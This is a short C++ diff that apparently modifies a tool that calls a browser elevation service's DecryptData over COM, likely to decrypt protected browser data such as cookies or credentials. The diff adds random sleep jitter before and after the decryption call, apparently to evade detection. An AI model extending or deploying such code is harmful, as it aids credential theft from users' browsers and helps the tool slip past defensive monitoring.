@@ -2,6 +2,7 @@
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include "elevator.hpp"
+#include "../core/jitter.hpp"
 #include <stdexcept>
 #include <sstream>
 
@@ -43,6 +44,8 @@ namespace Com
         BSTR bstrPlain = nullptr;
         DWORD comErr = 0;
         HRESULT hr = E_FAIL;
+
+        Core::Jitter::SleepRange(20, 80);
 
         if (isEdge)
         {
@@ -107,6 +110,8 @@ namespace Com
                 hr = elevator->DecryptData(bstrEnc, &bstrPlain, &comErr);
             }
         }
+
+        Core::Jitter::SleepRange(10, 50);
 
         if (FAILED(hr))
         {
